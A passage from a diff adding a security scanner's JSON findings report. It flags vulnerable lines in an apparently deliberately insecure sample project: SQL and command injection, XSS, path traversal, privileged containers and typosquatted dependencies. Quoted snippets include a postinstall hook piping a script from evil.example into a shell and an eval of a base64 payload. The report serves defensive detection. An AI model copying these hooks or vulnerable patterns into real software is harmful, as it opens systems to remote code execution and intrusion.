+      "location": {
+        "end_line": 8,
+        "path": "k8s/deployment.yaml",
+        "snippet": "hostNetwork: true",
+        "start_line": 8
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Remove hostNetwork/hostPID/hostIPC unless it is a vetted node-level agent.",
+      "rule_id": "IAC-K8S-HOST-NAMESPACE",
+      "severity": "high",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Pod shares host network/PID/IPC namespace",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "container",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-250"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-PRIVILEGED-CONTAINER.",
+      "fingerprint": "a638ee08860b66a42403",
+      "id": "AUTO-0022",
+      "impact": "",
+      "location": {
+        "end_line": 13,
+        "path": "k8s/deployment.yaml",
+        "snippet": "privileged: true",
+        "start_line": 13
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Remove privileged mode; grant only specific capabilities if strictly needed.",
+      "rule_id": "IAC-PRIVILEGED-CONTAINER",
+      "severity": "high",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Privileged container",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-506",
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-INSTALL-SCRIPT-SUSPICIOUS.",
+      "fingerprint": "bb8eda3867e4a012aea4",
+      "id": "AUTO-0023",
+      "impact": "",
+      "location": {
+        "end_line": 5,
+        "path": "package.json",
+        "snippet": "\"postinstall\": \"curl -s https://evil.example/install.sh | sh\",",
+        "start_line": 5
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Inspect the script statically (do NOT run it). Remove it or replace with an auditable build step; install with --ignore-scripts in CI.",
+      "rule_id": "SC-INSTALL-SCRIPT-SUSPICIOUS",
+      "severity": "high",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "suspected",
+      "title": "Install lifecycle script with network/eval/encoded payload",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "malware-indicator",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-506"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-OBFUSCATED-EXEC.",
+      "fingerprint": "828f528b189d08602241",
+      "id": "AUTO-0024",
+      "impact": "",
+      "location": {
+        "end_line": 3,
+        "path": "public/app.js",
+        "snippet": "eval(atob(params.get(\"payload\")));",
+        "start_line": 3
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Treat as potentially malicious: do not run it. Decode statically, identify origin (git blame/package), and remove or replace the component.",
+      "rule_id": "SC-OBFUSCATED-EXEC",
+      "severity": "high",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "suspected",
+      "title": "Execution of decoded/obfuscated payload",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "injection",
+      "confidence": "medium",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "cwe": [
+        "CWE-89"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-JS-SQL-STRING.",
+      "fingerprint": "b0ca6b33d1c14f1e5b8b",
+      "id": "AUTO-0025",
+      "impact": "",
+      "location": {
+        "end_line": 8,
+        "path": "server.js",
+        "snippet": "db.query(`SELECT * FROM items WHERE name = '${req.query.q}'`, (e, rows) => res.json(rows));",
+        "start_line": 8
+      },
+      "owasp": [
+        "A03:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use placeholders ($1, ?) with a values array, tagged templates (sql``, Prisma.sql), or the query builder.",
+      "rule_id": "INJ-JS-SQL-STRING",
+      "severity": "high",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "unverified",
+      "title": "SQL built with template literal or concatenation (JS/TS)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "injection",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-78"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-JS-CHILD-PROCESS-STRING.",
+      "fingerprint": "cb5a768108199db2b941",
+      "id": "AUTO-0026",
+      "impact": "",
+      "location": {
+        "end_line": 12,
+        "path": "server.js",
+        "snippet": "exec(`convert ${req.query.file} out.png`, () => res.send(\"ok\"));",
+        "start_line": 12
+      },
+      "owasp": [
+        "A03:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use execFile/spawn with an argument array and no shell; validate inputs against an allowlist.",
+      "rule_id": "INJ-JS-CHILD-PROCESS-STRING",
+      "severity": "high",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "unverified",
+      "title": "child_process exec with dynamic string",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "xss",
+      "confidence": "medium",
+      "cvss_score": 6.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for XSS-REFLECTED-SEND.",
+      "fingerprint": "aa4ea01d55513ff58615",
+      "id": "AUTO-0027",
+      "impact": "",
+      "location": {
+        "end_line": 16,
+        "path": "server.js",
+        "snippet": "res.send(`<p>Welcome ${req.query.name}</p>`);",
+        "start_line": 16
+      },
+      "owasp": [
+        "A03:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Encode output for the HTML context or render through an auto-escaping template; set Content-Type correctly.",
+      "rule_id": "XSS-REFLECTED-SEND",
+      "severity": "high",
+      "sources": [
+        "builtin:xss"
+      ],
+      "status": "unverified",
+      "title": "Request data written directly to HTML response",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "authentication",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-798",
+        "CWE-321"
+      ],
+      "description": "",
+      "evidence": "Value hard\u2026[redacted 26 chars] (entropy 3.72). Secret redacted; it was not used or validated.",
+      "fingerprint": "a0d24d2917f772b70045",
+      "id": "AUTO-0028",
+      "impact": "",
+      "location": {
+        "end_line": 26,
+        "path": "server.js",
+        "snippet": "const token = jwt.sign({ id: 1 }, \"hard\u2026[redacted 26 chars]\");",
+        "start_line": 26
+      },
+      "owasp": [
+        "A07:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Load signing keys from a secrets manager; prefer asymmetric keys; rotate the exposed secret.",
+      "rule_id": "AUTH-JWT-HARDCODED-SECRET",
+      "severity": "high",
+      "sources": [
+        "builtin:auth"
+      ],
+      "status": "unverified",
+      "title": "JWT signed/verified with hardcoded secret",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "path-traversal",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-22"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-PATH-TRAVERSAL-JS.",
+      "fingerprint": "91240de6a5f4678e96f6",
+      "id": "AUTO-0029",
+      "impact": "",
+      "location": {
+        "end_line": 30,
+        "path": "server.js",
+        "snippet": "app.get(\"/file\", (req, res) => res.sendFile(req.query.path));",
+        "start_line": 30
+      },
+      "owasp": [
+        "A01:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Resolve against a fixed base directory, reject paths escaping it (path.resolve + startsWith check), or map IDs to files server-side.",
+      "rule_id": "INJ-PATH-TRAVERSAL-JS",
+      "severity": "high",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "unverified",
+      "title": "Request data used in filesystem path (JS)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "secrets",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-538"
+      ],
+      "description": "",
+      "evidence": "Matched 1 required signal(s).",
+      "fingerprint": "e6a5614450e5c971012f",
+      "id": "AUTO-0030",
+      "impact": "",
+      "location": {
+        "end_line": 1,
+        "path": ".env",
+        "snippet": "DATABASE_URL=post\u2026[redacted 49 chars]",
+        "start_line": 1
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Do not commit .env files; add them to .gitignore, commit a placeholder .env.example, and rotate any real values.",
+      "rule_id": "CFG-ENV-FILE-PRESENT",
+      "severity": "medium",
+      "sources": [
+        "builtin:config"
+      ],
+      "status": "unverified",
+      "title": "Environment file with values in repository",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "container",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-250"
+      ],
+      "description": "",
+      "evidence": "Matched 1 required signal(s); none of 1 expected control pattern(s) present.",
+      "fingerprint": "948597abf5ec2db9d8a7",
+      "id": "AUTO-0031",
+      "impact": "",
+      "location": {
+        "end_line": 1,
+        "path": "Dockerfile",
+        "snippet": "FROM python:latest",
+        "start_line": 1
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Add a non-root user and `USER <uid>` in the final stage; combine with runAsNonRoot in Kubernetes.",
+      "rule_id": "IAC-DOCKER-NO-USER",
+      "severity": "medium",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "missing-control",
+      "title": "Container runs as root (no non-root USER)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "container",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-494"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-DOCKER-ADD-REMOTE.",
+      "fingerprint": "04ff9c274195571b0dfc",
+      "id": "AUTO-0032",
+      "impact": "",
+      "location": {
+        "end_line": 2,
+        "path": "Dockerfile",
+        "snippet": "ADD https://example.com/tool.tar.gz /opt/",
+        "start_line": 2
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Download with curl/wget and verify a checksum or signature, or COPY vendored artifacts.",
+      "rule_id": "IAC-DOCKER-ADD-REMOTE",
+      "severity": "medium",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "ADD fetches remote URL",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-494"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-CURL-PIPE-SHELL.",
+      "fingerprint": "a4053468cba7b2f4572d",
+      "id": "AUTO-0033",
+      "impact": "",
+      "location": {
+        "end_line": 5,
+        "path": "Dockerfile",
+        "snippet": "RUN curl -fsSL https://get.example.sh | bash",
+        "start_line": 5
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Download to a file, verify checksum/signature, then execute; or use a package manager.",
+      "rule_id": "SC-CURL-PIPE-SHELL",
+      "severity": "medium",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "unverified",
+      "title": "Remote script piped to shell",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "open-redirect",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-601"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-OPEN-REDIRECT.",
+      "fingerprint": "307ba00f90cfb4c6c75e",
+      "id": "AUTO-0034",
+      "impact": "",
+      "location": {
+        "end_line": 40,
+        "path": "app.py",
+        "snippet": "return redirect(request.args.get(\"next\"))",
+        "start_line": 40
+      },
+      "owasp": [
+        "A01:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Redirect only to relative paths or an allowlist of hosts; reject scheme-relative (//) and backslash tricks.",
+      "rule_id": "INJ-OPEN-REDIRECT",
+      "severity": "medium",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "unverified",
+      "title": "Redirect to user-controlled location",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cloud",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-284"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-TF-OPEN-INGRESS.",
+      "fingerprint": "a705c05ffeea4eb69c4d",
+      "id": "AUTO-0035",
+      "impact": "",
+      "location": {
+        "end_line": 8,
+        "path": "infra/main.tf",
+        "snippet": "cidr_blocks = [\"0.0.0.0/0\"]",
+        "start_line": 8
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Restrict source ranges to known CIDRs; never expose SSH/RDP/DB ports publicly; put services behind a load balancer/WAF.",
+      "rule_id": "IAC-TF-OPEN-INGRESS",
+      "severity": "medium",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Network rule open to the internet (0.0.0.0/0 or ::/0)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cloud",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-311"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-ENCRYPTION-DISABLED.",
+      "fingerprint": "fe61ed8333ff52c93ba8",
+      "id": "AUTO-0036",
+      "impact": "",
+      "location": {
+        "end_line": 20,
+        "path": "infra/main.tf",
+        "snippet": "storage_encrypted   = false",
+        "start_line": 20
+      },
+      "owasp": [
+        "A02:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Enable encryption at rest with KMS CMKs and automatic key rotation.",
+      "rule_id": "IAC-ENCRYPTION-DISABLED",
+      "severity": "medium",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Encryption at rest or key rotation disabled",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cloud",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-918"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-IMDSV1-ALLOWED.",
+      "fingerprint": "cc84e455f56bd9836abe",
+      "id": "AUTO-0037",
+      "impact": "",
+      "location": {
+        "end_line": 25,
+        "path": "infra/main.tf",
+        "snippet": "metadata_options { http_tokens = \"optional\" }",
+        "start_line": 25
+      },
+      "owasp": [
+        "A10:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Require IMDSv2: http_tokens = \"required\" (limits SSRF-to-credential theft).",
+      "rule_id": "IAC-IMDSV1-ALLOWED",
+      "severity": "medium",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "EC2 instance metadata v1 allowed",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "kubernetes",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-250"
+      ],
+      "description": "",
+      "evidence": "Matched 1 required signal(s); none of 1 expected control pattern(s) present.",
+      "fingerprint": "dc4f9e8d16324e391f1e",
+      "id": "AUTO-0038",
+      "impact": "",
+      "location": {
+        "end_line": 2,
+        "path": "k8s/deployment.yaml",
+        "snippet": "kind: Deployment",
+        "start_line": 2
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Set securityContext: runAsNonRoot: true, readOnlyRootFilesystem: true, allowPrivilegeEscalation: false, capabilities.drop: [ALL], seccompProfile RuntimeDefault.",
+      "rule_id": "IAC-K8S-NO-SECURITY-CONTEXT",
+      "severity": "medium",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "missing-control",
+      "title": "Workload without runAsNonRoot",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "kubernetes",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-250"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-K8S-PRIV-ESCALATION.",
+      "fingerprint": "5c928fb5280f3c2177d2",
+      "id": "AUTO-0039",
+      "impact": "",
+      "location": {
+        "end_line": 14,
+        "path": "k8s/deployment.yaml",
+        "snippet": "allowPrivilegeEscalation: true",
+        "start_line": 14
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Set allowPrivilegeEscalation: false.",
+      "rule_id": "IAC-K8S-PRIV-ESCALATION",
+      "severity": "medium",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "allowPrivilegeEscalation enabled",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "low",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Name is one edit away from 'lodash' (npm). This is a heuristic, not proof of malice.",
+      "fingerprint": "77abbf21d701cabd1f6e",
+      "id": "AUTO-0040",
+      "impact": "",
+      "location": {
+        "end_line": 12,
+        "path": "package.json",
+        "snippet": "lodahs",
+        "start_line": 12
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Verify the package's publisher, repository, download history and creation date; replace with the intended package if it is a typo.",
+      "rule_id": "SC-TYPOSQUAT-CANDIDATE",
+      "severity": "medium",
+      "sources": [
+        "builtin:supply-chain-structural"
+      ],
+      "status": "suspected",
+      "title": "Dependency 'lodahs' resembles popular package 'lodash'",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-DEP-FROM-URL.",
+      "fingerprint": "7a800cf9808af7ef80c2",
+      "id": "AUTO-0041",
+      "impact": "",
+      "location": {
+        "end_line": 13,
+        "path": "package.json",
+        "snippet": "\"left-pad\": \"git+https://github.com/example/left-pad.git\"",
+        "start_line": 13
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Prefer registry releases pinned in a lockfile; if a git dependency is needed pin to a commit SHA.",
+      "rule_id": "SC-DEP-FROM-URL",
+      "severity": "medium",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "unverified",
+      "title": "Dependency fetched from git/URL/file instead of registry",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "xss",
+      "confidence": "low",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for XSS-DOM-INNERHTML.",
+      "fingerprint": "21c25e641b3a581a129d",
+      "id": "AUTO-0042",
+      "impact": "",
+      "location": {
+        "end_line": 2,
+        "path": "public/app.js",
+        "snippet": "document.getElementById(\"out\").innerHTML = params.get(\"msg\");",
+        "start_line": 2
+      },
+      "owasp": [
+        "A03:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use textContent or DOM APIs; sanitize HTML with DOMPurify when markup is required; adopt Trusted Types.",
+      "rule_id": "XSS-DOM-INNERHTML",
+      "severity": "medium",
+      "sources": [
+        "builtin:xss"
+      ],
+      "status": "unverified",
+      "title": "Assignment to innerHTML/outerHTML",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "injection",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-95"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-JS-EVAL.",
+      "fingerprint": "84464002c7f71c84ef30",
+      "id": "AUTO-0043",
+      "impact": "",
+      "location": {
+        "end_line": 3,
+        "path": "public/app.js",
+        "snippet": "eval(atob(params.get(\"payload\")));",
+        "start_line": 3
+      },
+      "owasp": [
+        "A03:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Remove dynamic code evaluation; use JSON.parse, lookup tables, or function references.",
+      "rule_id": "INJ-JS-EVAL",
+      "severity": "medium",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "unverified",
+      "title": "eval / new Function / string timers (JS)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "low",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Name is one edit away from 'requests' (pypi). This is a heuristic, not proof of malice.",
+      "fingerprint": "c0691e65bf0c5de27109",
+      "id": "AUTO-0044",
+      "impact": "",
+      "location": {
+        "end_line": 4,
+        "path": "requirements.txt",
+        "snippet": "reqeusts",
+        "start_line": 4
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Verify the package's publisher, repository, download history and creation date; replace with the intended package if it is a typo.",
+      "rule_id": "SC-TYPOSQUAT-CANDIDATE",
+      "severity": "medium",
+      "sources": [
+        "builtin:supply-chain-structural"
+      ],
+      "status": "suspected",
+      "title": "Dependency 'reqeusts' resembles popular package 'requests'",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-427",
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-PIP-EXTRA-INDEX.",
+      "fingerprint": "fa5e4165dfe215abf796",
+      "id": "AUTO-0045",
+      "impact": "",
+      "location": {
+        "end_line": 5,
+        "path": "requirements.txt",
+        "snippet": "--extra-index-url https://pypi.internal.example/simple",
+        "start_line": 5
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use a single private index that proxies the public one, pin hashes (--require-hashes), and reserve internal names publicly.",
+      "rule_id": "SC-PIP-EXTRA-INDEX",
+      "severity": "medium",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "unverified",
+      "title": "Additional package index (dependency confusion risk)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cors",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-942"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for CFG-CORS-WILDCARD.",
+      "fingerprint": "3bbdb19ead93be0aaf6b",
+      "id": "AUTO-0046",
+      "impact": "",
+      "location": {
+        "end_line": 5,
+        "path": "server.js",
+        "snippet": "app.use(require(\"cors\")());",
+        "start_line": 5
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Allow an explicit list of trusted origins; never combine wildcard/reflection with credentials.",
+      "rule_id": "CFG-CORS-WILDCARD",
+      "severity": "medium",
+      "sources": [
+        "builtin:config"
+      ],
+      "status": "unverified",
+      "title": "CORS allows any origin",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "authorization",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-915"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for AUTH-MASS-ASSIGNMENT.",
+      "fingerprint": "8518189194eac3ec47a0",
+      "id": "AUTO-0047",
+      "impact": "",
+      "location": {
+        "end_line": 20,
+        "path": "server.js",
+        "snippet": "const user = await User.create(req.body);",
+        "start_line": 20
+      },
+      "owasp": [
+        "A01:2021",
+        "API3:2023"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Bind an explicit allowlist of fields (DTO/serializer fields/strong params); never let clients set role, owner, price, or tenant.",
+      "rule_id": "AUTH-MASS-ASSIGNMENT",
+      "severity": "medium",
+      "sources": [
+        "builtin:auth"
+      ],
+      "status": "unverified",
+      "title": "Request body bound directly to a model",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "authentication",
+      "confidence": "low",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-347"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for AUTH-JWT-DECODE-NO-VERIFY-JS.",
+      "fingerprint": "01245f1dec0ad603d01a",
+      "id": "AUTO-0048",
+      "impact": "",
+      "location": {
+        "end_line": 25,
+        "path": "server.js",
+        "snippet": "const claims = jwt.decode(req.headers.authorization);",
+        "start_line": 25
+      },
+      "owasp": [
+        "A07:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use jwt.verify(token, key, { algorithms: [...] }) for any trust decision.",
+      "rule_id": "AUTH-JWT-DECODE-NO-VERIFY-JS",
+      "severity": "medium",
+      "sources": [
+        "builtin:auth"
+      ],
+      "status": "unverified",
+      "title": "jsonwebtoken decode() does not verify signatures",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "crypto",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-338"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for CRY-INSECURE-RANDOM.",
+      "fingerprint": "ce144029edd1334eb819",
+      "id": "AUTO-0049",
+      "impact": "",
+      "location": {
+        "end_line": 27,
+        "path": "server.js",
+        "snippet": "res.json({ claims, token, sid: Math.random().toString(36) });",
+        "start_line": 27
+      },
+      "owasp": [
+        "A02:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use secrets / crypto.randomBytes / crypto.getRandomValues / SecureRandom / crypto/rand.",
+      "rule_id": "CRY-INSECURE-RANDOM",
+      "severity": "medium",
+      "sources": [
+        "builtin:crypto"
+      ],
+      "status": "unverified",
+      "title": "Non-cryptographic RNG used for security value",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cicd",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-250"
+      ],
+      "description": "",
+      "evidence": "Matched 1 required signal(s); none of 1 expected control pattern(s) present.",
+      "fingerprint": "9c7f3c4db96611285219",
+      "id": "AUTO-0050",
+      "impact": "",
+      "location": {
+        "end_line": 5,
+        "path": ".github/workflows/ci.yml",
+        "snippet": "jobs:",
+        "start_line": 5
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Add top-level `permissions: contents: read` and grant write scopes per job only where needed.",
+      "rule_id": "CI-GHA-NO-PERMISSIONS",
+      "severity": "low",
+      "sources": [
+        "builtin:cicd"
+      ],
+      "status": "missing-control",
+      "title": "Workflow without explicit token permissions",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cicd",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for CI-GHA-UNPINNED-ACTION.",
+      "fingerprint": "44a689331bcb20ef506f",
+      "id": "AUTO-0051",
+      "impact": "",
+      "location": {
+        "end_line": 12,
+        "path": ".github/workflows/ci.yml",
+        "snippet": "- uses: some-org/deploy-action@v2",
+        "start_line": 12
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Pin to a full 40-char commit SHA (with a version comment) and let Dependabot update it.",
+      "rule_id": "CI-GHA-UNPINNED-ACTION",
+      "severity": "low",
+      "sources": [
+        "builtin:cicd"
+      ],
+      "status": "unverified",
+      "title": "Third-party GitHub Action not pinned to a commit SHA",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "container",
+      "confidence": "low",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-1357"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-DOCKER-UNPINNED-BASE.",
+      "fingerprint": "2c205d341653de6ac5e1",
+      "id": "AUTO-0052",
+      "impact": "",
+      "location": {
+        "end_line": 1,
+        "path": "Dockerfile",
+        "snippet": "FROM python:latest",
+        "start_line": 1
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Pin base images to a version tag and digest (image:tag@sha256:...); update via Dependabot/Renovate.",
+      "rule_id": "IAC-DOCKER-UNPINNED-BASE",
+      "severity": "low",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Base image unpinned or :latest",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "kubernetes",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
